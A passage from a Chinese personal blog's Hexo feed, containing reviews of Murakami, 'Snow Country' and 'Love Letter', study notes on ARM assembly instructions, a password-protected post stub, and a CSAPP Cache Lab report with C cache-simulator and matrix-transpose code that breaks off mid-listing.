村上春树是因为东京地下铁毒气事件开始写这篇小说的，因为他被这件事情所震惊，因为他不明白为什么会有人去做这种事情，于是他花了九年的时间去做调查。在调查中发现，这些人从个人层面上看，都并没有特别邪恶或者特别愚蠢。他们只是对这个世界不满，并且沉浸在自己的乌托邦之中。</p>
<p>在这本小说中，你其实可以想象它是一个梦，在梦中进行意识的攻城略地。但无可置疑的是，如果你仅仅沉浸在自己的世界中，不去面对现实，只把自己封锁在小房子里，“小小人”就会来临，通过制造“空气蛹”来制造子体，你的意识就会慢慢地丧失。<br>
这本小说，个人感觉除了致敬《1984》之外，也有《变形记》和《追忆似水年华》的影子.</p>
<p><img src="/2020/06/21/1/book.JPG" alt></p>
]]></content>
      <categories>
        <category>读书</category>
      </categories>
      <tags>
        <tag>文学</tag>
        <tag>爱情</tag>
        <tag>人生</tag>
      </tags>
  </entry>
  <entry>
    <title>雪国与情书</title>
    <url>/2020/06/08/1/</url>
    <content><![CDATA[<p><img src="/2020/06/08/1/jpg1.jpg" alt></p>
<p>在日本的浪漫文学中，“雪”的色彩占据了极大的比重。往往在故事的开头，都是在一片茫茫的白雪中，或是无人，或是人烟稀少，从未有过在一个繁华的都市中或是人眼麇集的闹市中的。在《雪国》的开头即是一个人人都可背诵的名段：</p>
<blockquote>
<p>穿过县界长长的隧道，便是雪国。夜空下一片白茫茫。火车在信号所前停了下来。</p>
</blockquote>
<a id="more"></a>
<p>在故事的开头，主人公岛村即在火车上遇上了一个美丽、纯粹得几乎不沾染任何人世间烟火的少女的叶子：</p>
<blockquote>
<p>这当儿，姑娘的脸上闪现着灯光。镜中映像的清晰度并没有减弱窗外的灯光。灯光也没有把映像抹去。灯火就这样从她的脸上闪过，但并没有把她的脸照亮。这是一束从远方投来的寒光，模模糊糊地照亮了她眼睛的周围。她的眼睛同灯光重叠的那一瞬间，就像在夕阳的余晖里飞舞的夜火虫，妖艳而美丽。</p>
</blockquote>
<p>故事讲述的是男主人公岛村三次来雪国与两个少女驹子与叶子所发生的故事，故事的开头正发生在岛村第二次来雪国的时候。随后，岛村望着自己的手指，思绪飘飞，于是时间线即一种偏意识流的方式流转在岛村三次来到雪国同少女驹子相识到熟识的过程。最终以叶子的死亡而结束。</p>
<p>《雪国》仅仅八万字，却是川端康成的集大成之作，在小说中渲染了”虚无“与”徒劳“的悲壮的浪漫色彩。岛村来自京都，家境殷实，却对爱情与事业都感到徒劳，他可以狂热地去爱上西洋舞蹈，去爱上一个驹子，但他却不敢把自己的全身心投入进去，也不敢去承诺任何东西，因为他从心底里都对这个世界充满了绝望，认为一切东西都是徒劳的，所以当驹子多次请求让他带她去京都的时候，他总是表示的暧昧。而驹子和叶子在小说中则是一对镜像人物。在岛村第一次来，是没有叶子的，因此此时的驹子就是叶子，同样的纯洁、美丽。后来驹子因为现实而沦落为艺伎，此时叶子出现了，此时的驹子是骨肉，叶子是灵魂；驹子是叶子的未来，叶子是驹子的过去；驹子为了生存而委身艺妓，而叶子则甘受贫穷，当驹子心底最后一丝希望破灭的时候，叶子堕火而死了，同时也代表着驹子魂灵的灭亡。</p>
<p>通过阅读这本小说，我们可以深刻体会到川端康成的美学，川端文学的美的“物哀”色彩是继承平安朝以《源氏物语》为中心形成的物哀精神，往往包含着悲哀与同情的意味。川端继承日本古典传统的“物哀”，又渗透着佛教禅宗的影响力，以“生—灭—生”的公式为中心的无常思想的影响力，在美的意识上重视幽玄、无常感和虚无的理念，构成川端康成美学的另一特征。</p>
<p>同时，阅读《雪国》也有助于我们了解近百年前日本高层知识分子对个人命运同国家命运的理解。因为不断的战争与对外的殖民侵略而丧失民众的生命与信心，一切都是无意义与虚无的。</p>
<p>现在来聊聊《情书》这本书，《情书》的出名则是因为岩井俊二在1995年拍摄的同名电影。但是通过阅读小说我们也可以发现一些电影所没有的细节。《情书》所讲述的是一个少年时期一男一女因为同名同姓的巧合而产生的长达十多年的爱情故事。</p>
<p>书中以男藤井树离世两周年忌日作为开场，渡边博子作为他的女朋友而参与了忌日，从而在藤井树母亲家发现了男主年少时就读中学的纪念册。她无法忘却逝去的男友，于是向他的家中寄了一封信，本来是聊以自慰，没想到后来竟然收到了一封信，她于是同来信人不断地来往信件，没想到竟牵扯出男友年少时一段隐匿的爱情。</p>
<p>同样，《情书》的故事也发生在冬天，且大雪遍地。小说（影片）的开头即是女主人公（渡边博子）从莽莽雪原中起身，茫然地望着天空，随后踱步而离去。这种雪花飘落的意境，同落寞的人融合在一起，自然而然地就会产生令人堕泪的情绪，也自然滋生了浪漫的情感，所谓浪漫者，即对于现实之事以浪漫化的处理。同从欧洲的浪漫主义不同，日本的浪漫主义更加与其文化结合，在其中加入了悲剧美学，这就更使得其令人心碎。</p>
<p>《情书》是一部真正的纯爱之书，在其中不掺杂一丝的世俗与火气，没有任何三角恋与狗血故事。仅仅是一个少年在年少时对一个少女而产生的淡淡的喜欢与心动，后来又因为现实而分开的故事。这爱情很淡，淡得不会影响一个人的生活；却又很浓，浓得可以几十年不曾忘记…</p>
]]></content>
      <categories>
        <category>读书</category>
      </categories>
      <tags>
        <tag>文学</tag>
        <tag>爱情</tag>
      </tags>
  </entry>
  <entry>
    <title>ARM Linux嵌入式系统</title>
    <url>/2020/06/04/1/</url>
    <content><![CDATA[<h2 id="arm指令集"><a class="markdownIt-Anchor" href="#arm指令集"></a> ARM指令集</h2>
<h3 id="算术运算指令"><a class="markdownIt-Anchor" href="#算术运算指令"></a> 算术运算指令</h3>
<p><strong>1.ADD指令</strong></p>
<p><code>ADD{条件} {S} &lt;dest&gt;, &lt;op_1&gt;, &lt;op_2&gt;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ADD   R0, R1, R2	; R0&#x3D;R1+R2</span><br><span class="line">ADD   R0, R1, $256	; R0&#x3D;R1+256</span><br></pre></td></tr></table></figure>
<p><strong>2.ADC指令</strong></p>
<p>用于带进位的加法运算</p>
<p><code>ADC{条件}{S} &lt;dest&gt;, &lt;op_1&gt;, &lt;op_2&gt;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ADCS   R0,R2,R3   ;带进位加，结果保存在R0和R1寄存器</span><br></pre></td></tr></table></figure>
<p><strong>3.SUB命令</strong></p>
<p>减法运算</p>
<p><code>SUB{条件}{S} &lt;dest&gt;, &lt;op_1&gt;, &lt;op_2&gt;</code></p>
<p><strong>4.SBC指令</strong></p>
<p>用于带借位的减法运算</p>
<p><code>SBC{条件}{S} &lt;dest&gt;, &lt;op_1&gt;, &lt;op_2&gt;</code></p>
<a id="more"></a>
<h3 id="逻辑运算指令"><a class="markdownIt-Anchor" href="#逻辑运算指令"></a> 逻辑运算指令</h3>
<p><strong>1.AND指令</strong></p>
<p><code>AND{条件}{S} &lt;dest&gt;, &lt;op_1&gt;, &lt;op_2&gt;</code></p>
<p><strong>2.EOR指令</strong></p>
<p>异或运算</p>
<p><code>EOR{条件}{S} &lt;dest&gt;, &lt;op_1&gt;, &lt;op_2&gt;</code></p>
<p><strong>3.MOV指令</strong></p>
<p>MOV可以在两个操作数之间复制数据</p>
<p><code>MOV{条件}{S} &lt;dest&gt;, &lt;op_1&gt;</code></p>
<h3 id="分支指令"><a class="markdownIt-Anchor" href="#分支指令"></a> 分支指令</h3>
<p><strong>B指令</strong></p>
<p>B指令可以根据设置的条件跳转带指定的代码位置</p>
<p><code>B{条件} &lt;地址&gt;</code></p>
<h3 id="数据传送指令"><a class="markdownIt-Anchor" href="#数据传送指令"></a> 数据传送指令</h3>
<p><strong>1.单一数据传送指令</strong></p>
<p>单一数据传送指令用于向内存转载和存储一个字节或者一个字长的数据。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LDR&#123;条件&#125;   Rd，&lt;地址&gt;</span><br><span class="line">STR&#123;条件&#125;   Rd，&lt;地址&gt;</span><br><span class="line">LDR&#123;条件&#125;B   Rd，&lt;地址&gt;</span><br><span class="line">STR&#123;条件&#125;B   Rd，&lt;地址&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">STR   Rd, [Rbase]          ;存储Rd到Rbase所包含的有效地址</span><br><span class="line">STR   Rd, [Rbase, Rindex]  ;存储到Rd到Rbase+Rindex缩合成的有效地址</span><br><span class="line">STR   Rd, [Rbase, $index]  ;存储到Rd到Rbase+index所合成的有效地址</span><br></pre></td></tr></table></figure>
<p><strong>2.多数据传送指令</strong></p>
<p>多数据传送指令用于向内存装载和存储多个字节或字的数据。</p>
<p><code>xxM{条件}{类型} Rn{!}, &lt;寄存器列表&gt;{^}</code></p>
<p>其中，xx可以是LD，表示装载，也可以为ST，表示存储。多数据传送指令用于寄存器和内存中多个数据的复制。指令包括：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LDMED    LDMED    ;装载前增加地址，相当于C中的++p</span><br><span class="line">LDMFD    LDMIA    ;装载后增加地址，相当于C中的p++</span><br><span class="line">LDMED    LDMED    ;装载前减小值，相当于C中的++*p</span><br><span class="line">LDMED    LDMED    ;装载后减小值，相当于C中的*p++</span><br><span class="line">STMFA    STMIB    ;存储前增加地址</span><br><span class="line">STMEA    STMIA    ;存储后增加地址</span><br><span class="line">STMFD    STMDB    ;存储前增加值</span><br><span class="line">STMED    STMDA    ;存储后增加值</span><br></pre></td></tr></table></figure>
<h2 id="arm结构"><a class="markdownIt-Anchor" href="#arm结构"></a> ARM结构</h2>
<h3 id="寻址方式"><a class="markdownIt-Anchor" href="#寻址方式"></a> 寻址方式</h3>
<p><strong>1.立即寻址</strong></p>
<p>立即寻址方式中操作数已经写在了指令里面，取出指令时会把操作数也取出来。这是最简单的寻址方式。</p>
<p><strong>2.寄存器寻址</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MOV R1, R2     ;把R2的值赋给R1</span><br><span class="line">SUB R0, R1, R2 ;把R1-R2的值写给R0</span><br></pre></td></tr></table></figure>
<p><strong>3.寄存器偏移寻址</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MOV R0, R1, LSL #3       ;把R1的值左移三位写入R0</span><br><span class="line">ANDS R0, R1, R2, LSL #R3 ;把R2的值左移R3位，然后与R1做与操作，结果写入R0</span><br></pre></td></tr></table></figure>
<p><strong>4.寄存器间接寻址</strong></p>
<p>该方式把寄存器的值当做地址，然后从对应的内存中取出数据。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LDR R0, [R1]        ;把R1的值当做地址，从内存中取出数据存放到R0</span><br><span class="line">SWP R0, R0, [R1]    ;把R1的值当做地址，从内存中取出数据与R0交换</span><br></pre></td></tr></table></figure>
<p><strong>5，基址寻址</strong></p>
<p>该方式把寄存器的内容与指定的偏移相加，得到数据地址，然后从内存取得数据。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LDR R0, [R1, #0xf]      ;把R1的数值与0xf相加得到数据地址</span><br><span class="line">STR R0，[R1, #-2]</span><br></pre></td></tr></table></figure>
<p><strong>6.多寄存器寻址</strong></p>
<p>该方式允许一次可以传输多个寄存器的值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LDMIA R1!, &#123;R2-R7,R12&#125;   ;把R1单元中的数据读出到R2~R7和R12，R1指定的地址自动加1</span><br><span class="line">STMIA R0,  &#123;R3-R6,R10&#125;   ;把R3~R6和R10中的数据保存到R0指向的地址，R0的地址自动加1</span><br></pre></td></tr></table></figure>
<p><strong>7.栈寻址</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">STMFD SP!, &#123;R0~R7, LR&#125;     ;把R0~R7的内容压入堆栈</span><br><span class="line">LDMFD SP!, &#123;R0,R7, LR&#125;     ;从堆栈中取出数据到R0~R7和LR</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>嵌入式系统</tag>
        <tag>ARM</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机系统基础大作业</title>
    <url>/2020/06/02/1/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Hey, password is required here.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="ad1fa2884930910a25c64bc04db500cf60d695312c7a1e31b9a5f2f3b3edb181"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>Cache Lab实验报告</title>
    <url>/2020/04/29/1/</url>
    <content><![CDATA[<p><img src="/2020/04/29/1/csapp.jpg" alt></p>
<a id="more"></a>
<h1 id="csapp-cache-lab解题报告"><a class="markdownIt-Anchor" href="#csapp-cache-lab解题报告"></a> CSAPP Cache Lab解题报告</h1>
<h3 id="任务a"><a class="markdownIt-Anchor" href="#任务a"></a> 任务A</h3>
<p><strong>实现代码：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"cachelab.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;getopt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADDR_SIZE 64;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span>* filePath;</span><br><span class="line">    <span class="keyword">int</span> setNum;</span><br><span class="line">    <span class="keyword">int</span> lineNum;</span><br><span class="line">    <span class="keyword">int</span> blockNum;</span><br><span class="line">    <span class="keyword">bool</span> verbose;</span><br><span class="line">&#125;GlobalArgs;</span><br><span class="line">GlobalArgs globalArgs;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> tag;</span><br><span class="line">    <span class="keyword">int</span> timestamp;</span><br><span class="line">&#125;CacheLine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span>* optString=<span class="string">"hvs:E:b:t:"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintHelp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,<span class="string">"Usage: ./csim [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,<span class="string">"Options:"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,<span class="string">"  -h         Print this help message"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,<span class="string">"  -v         Optional verbose flag"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,<span class="string">"  -s &lt;num&gt;   Number of set index bits."</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,<span class="string">"  -E &lt;num&gt;   Number of lines per set."</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,<span class="string">"  -b &lt;num&gt;   Number of block offset bits"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,<span class="string">"  -t &lt;file&gt;  Trace file."</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,<span class="string">"Examples:"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,<span class="string">"  linux&gt;  ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,<span class="string">"  linux&gt;  ./csim-ref -v -s 8 -E 2 -b 4 -t traces/yi.trace"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetArgus</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> opt=getopt(argc,argv,optString);</span><br><span class="line">    <span class="keyword">while</span> (opt!=<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (opt)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'h'</span>:</span><br><span class="line">                PrintHelp();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'v'</span>:</span><br><span class="line">                globalArgs.verbose=<span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'s'</span>:</span><br><span class="line">                globalArgs.setNum=atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'E'</span>:</span><br><span class="line">                globalArgs.lineNum=atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'b'</span>:</span><br><span class="line">                globalArgs.blockNum=atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'t'</span>:</span><br><span class="line">                globalArgs.filePath=optarg;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"wrong argument\n"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        opt=getopt(argc,argv,optString);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TryToHitCache</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> address,<span class="keyword">int</span>* hit,<span class="keyword">int</span>* miss,<span class="keyword">int</span>* eviction,CacheLine* cache)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> timestamp=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> tagLen=<span class="number">64</span>-(globalArgs.setNum+globalArgs.blockNum);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">set</span>=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)((address&lt;&lt;tagLen)&gt;&gt;(tagLen+globalArgs.blockNum));</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> tag=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(address&gt;&gt;(<span class="number">64</span>-tagLen));</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">min</span>=globalArgs.lineNum*<span class="built_in">set</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;globalArgs.lineNum;i++)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> idx=<span class="built_in">set</span>*globalArgs.lineNum+i;</span><br><span class="line">        <span class="keyword">if</span>(cache[idx].tag==tag&amp;&amp;cache[idx].timestamp!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cache[idx].timestamp=++timestamp;</span><br><span class="line">            (*hit)++;</span><br><span class="line">            <span class="keyword">if</span>(globalArgs.verbose)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"hit "</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(cache[idx].timestamp==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cache[idx].timestamp=++timestamp;</span><br><span class="line">            (*miss)++;</span><br><span class="line">            cache[idx].tag=tag;</span><br><span class="line">            <span class="keyword">if</span>(globalArgs.verbose)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"miss "</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(cache[idx].timestamp&lt;cache[<span class="built_in">min</span>].timestamp)</span><br><span class="line">            <span class="built_in">min</span>=idx;</span><br><span class="line">    &#125;</span><br><span class="line">    cache[<span class="built_in">min</span>].timestamp=++timestamp;</span><br><span class="line">    cache[<span class="built_in">min</span>].tag=tag;</span><br><span class="line">    (*miss)++;</span><br><span class="line">    (*eviction)++;</span><br><span class="line">    <span class="keyword">if</span>(globalArgs.verbose)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"miss eviction "</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    SetArgus(argc,argv);</span><br><span class="line">    <span class="keyword">if</span>(globalArgs.filePath==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    FILE* fp=fopen(globalArgs.filePath,<span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"File not found %s\n"</span>,globalArgs.filePath);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> hit=<span class="number">0</span>,miss=<span class="number">0</span>,eviction=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> S=(<span class="number">1</span>&lt;&lt;globalArgs.setNum);</span><br><span class="line">    <span class="keyword">int</span> E=globalArgs.lineNum;</span><br><span class="line"></span><br><span class="line">     CacheLine* cache=<span class="built_in">calloc</span>(S*E, <span class="keyword">sizeof</span>(CacheLine));</span><br><span class="line"></span><br><span class="line">     <span class="keyword">char</span> opt;</span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">long</span> address;</span><br><span class="line">     <span class="keyword">int</span> block;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     <span class="keyword">while</span>(<span class="built_in">fscanf</span>(fp,<span class="string">" %c %lx,%d"</span>, &amp;opt,&amp;address,&amp;block)&gt;<span class="number">0</span>)</span><br><span class="line">     &#123;</span><br><span class="line">        <span class="keyword">if</span>(opt==<span class="string">'I'</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span>(globalArgs.verbose)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c %lx,%d "</span>,opt,address,block);</span><br><span class="line">        &#125;</span><br><span class="line">        TryToHitCache(address,&amp;hit,&amp;miss,&amp;eviction,cache);</span><br><span class="line">        <span class="keyword">if</span>(opt==<span class="string">'M'</span>)</span><br><span class="line">            TryToHitCache(address,&amp;hit,&amp;miss,&amp;eviction,cache);</span><br><span class="line">        <span class="keyword">if</span>(globalArgs.verbose)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     fclose(fp);</span><br><span class="line">     <span class="built_in">free</span>(cache);</span><br><span class="line"></span><br><span class="line">     printSummary(hit,miss,eviction);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>任务A就是打开文件读入数据、处理数据、输出数据的过程，核心逻辑就是在于怎么模拟一个高速缓存来处理数据。我们将这部分逻辑封装在了<code>void TryToHitCache(unsigned long address,int* hit,int* miss,int* eviction,CacheLine* cache)</code>这个函数中。</p>
<p>首先我们定义一个静态变量<code>static int timestamp</code>，这个变量用来记录CPU向高速缓存器访问的时间戳（用来记录访问次数）。在该函数里我们需要接受几个参数，分别为请求的地址，hit次数，miss次数，eviction次数以及模拟的高速缓存器。然后我们将address的各部分结构进行解析，分别得到了set、tag等参数。</p>
<p>然后我们遍历模拟高速缓存器的组，比较address解析的set数是否与模拟缓存器的set数相同和是否可能为冷未命中的情况下。</p>
<p>如果能找到相同的tag且不是冷未命中的话，就将hit++，且更改<code>timestamp</code>的值。如果是冷未命中的话，就将miss++，并且更新<code>timestamp</code>的值并且设置该块的值。</p>
<p>如果则两种情况都不是的话，则需要更换块的内容。那么我们需要更新哪个块呢？根据局部性原则，我们应当更新距离我们这次访问时间戳距离最远的块，因此我们遍历一遍该组并找出该块并进行更换。然后进行更新数据。</p>
<h3 id="任务b"><a class="markdownIt-Anchor" href="#任务b"></a> 任务B:</h3>
<p><strong>实现代码：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transpose_submit</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a1,a2,a3,a4,a5,a6,a7,a8;</span><br><span class="line">    <span class="keyword">int</span> i,j,k,h;</span><br><span class="line">    <span class="keyword">if</span>(N==<span class="number">32</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(k=i*<span class="number">8</span>;k&lt;(i+<span class="number">1</span>)*<span class="number">8</span>;k++)&#123;</span><br><span class="line">                    h=j*<span class="number">8</span>;</span><br><span class="line">                    a1=A[k][h];a2=A[k][h+<span class="number">1</span>];a3=A[k][h+<span class="number">2</span>];a4=A[k][h+<span class="number">3</span>];</span><br><span class="line">                    a5=A[k][h+<span class="number">4</span>];a6=A[k][h+<span class="number">5</span>];a7=A[k][h+<span class="number">6</span>];a8=A[k][h+<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                    B[h][k]=a1;B[h+<span class="number">1</span>][k]=a2;B[h+<span class="number">2</span>][k]=a3;B[h+<span class="number">3</span>][k]=a4;</span><br><span class="line">                    B[h+<span class="number">4</span>][k]=a5;B[h+<span class="number">5</span>][k]=a6;B[h+<span class="number">6</span>][k]=a7;B[h+<span class="number">7</span>][k]=a8;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(N==<span class="number">64</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">64</span>;i+=<span class="number">8</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">64</span>;j+=<span class="number">8</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(k=j;k&lt;j+<span class="number">4</span>;++k)&#123;</span><br><span class="line">                    a1=A[k][i];a2=A[k][i+<span class="number">1</span>];a3=A[k][i+<span class="number">2</span>];a4=A[k][i+<span class="number">3</span>];</span><br><span class="line">                    a5=A[k][i+<span class="number">4</span>];a6=A[k][i+<span class="number">5</span>];a7=A[k][i+<span class="number">6</span>];a8=A[k][i+<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                    B[i][k]=a1;B[i][k+<span class="number">4</span>]=a5;B[i+<span class="number">1</span>][k]=a2;B[i+<span class="number">1</span>][k+<span class="number">4</span>]=a6;</span><br><span class="line">                    B[i+<span class="number">2</span>][k]=a3;B[i+<span class="number">2</span>][k+<span class="number">4</span>]=a7;B[i+<span class="number">3</span>][k]=a4;B[i+<span class="number">3</span>][k+<span class="number">4</span>]=a8;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span>(k=i;k&lt;i+<span class="number">4</span>;++k)&#123;</span><br><span class="line">                    a1=B[k][j+<span class="number">4</span>];a2=B[k][j+<span class="number">5</span>];a3=B[k][j+<span class="number">6</span>];a4=B[k][j+<span class="number">7</span>];</span><br><span class="line">                    a5=A[j+<span class="number">4</span>][k];a6=A[j+<span class="number">5</span>][k];a7=A[j+<span class="number">6</span>][k];a8=A[j+<span class="number">7</span>][k];</span><br><span class="line"></span><br><span class="line">                    B[k][j+<span class="number">4</span>]=a5;B[k][j+<span class="number">5</span>]=a6;B[k][j+<span class="number">6</span>]=a7;B[k][j+<span 